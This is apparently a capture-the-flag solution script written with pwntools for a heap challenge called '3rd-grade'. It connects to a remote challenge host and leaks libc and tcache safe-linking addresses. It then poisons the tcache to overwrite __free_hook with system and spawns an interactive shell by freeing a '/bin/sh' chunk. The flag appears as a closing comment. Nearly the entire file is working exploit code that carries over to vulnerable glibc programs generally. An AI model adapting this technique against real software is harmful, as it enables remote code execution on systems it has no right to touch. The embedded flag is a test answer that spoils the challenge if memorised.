from pwn import * 
#context.log_level = 'debug'

#r = process('./3rd-grade')
#r = gdb.debug('./3rd-grade', 'b view_chunk\nc')
r = remote('0.cloud.chals.io', 21371)

libc = ELF('./libc.so.6')

def sendi(i):
    r.sendlineafter(b'Index? \n', str(i).encode())
def sendo(o):
    r.sendlineafter(b'Choose an option:\n', str(o).encode())
def malloc(i, sz):
    sendo(1)
    sendi(i)
    r.sendlineafter(b'Size? \n', str(sz).encode())
def edit(i, content):
    sendo(2)
    sendi(i)
    r.sendlineafter(b'Content? ', content)
def view(i):
    sendo(4)
    sendi(i)
    return r.recvline(keepends=False)
def free(i): 
    sendo(3)
    sendi(i) 

# the libc address that the pointer in the unsorted bin chunk has a null byte,
# so force malloc to use a different bin
malloc(0, 0x410)
malloc(1, 0x410)
free(0)
malloc(2, 10)
leak = view(2)
print('leak', leak.hex())
libc.address = u64(leak.ljust(8, b'\x00')) - 0x1e3ff0
print(f'libc.address = {hex(libc.address)}')
assert libc.address & 0xfff == 0
target = libc.sym['__free_hook']
target_val = libc.sym['system']
free(1)
free(2)

malloc(0, 5)
malloc(1, 5)
free(0)
key = u64(view(0)+b'\x00\x00\x00')
print(f'heap key = {hex(key)}')
free(1)

malloc(0, 10)
malloc(1, 10)
free(0)
free(1)
edit(1, p64(target ^ key))
malloc(0, 10)
malloc(1, 10)
edit(1, p64(target_val))

edit(0, b'/bin/sh\x00')
free(0)

r.interactive()

# UDCTF{RuN_f0ResT_ruNnNnNn}



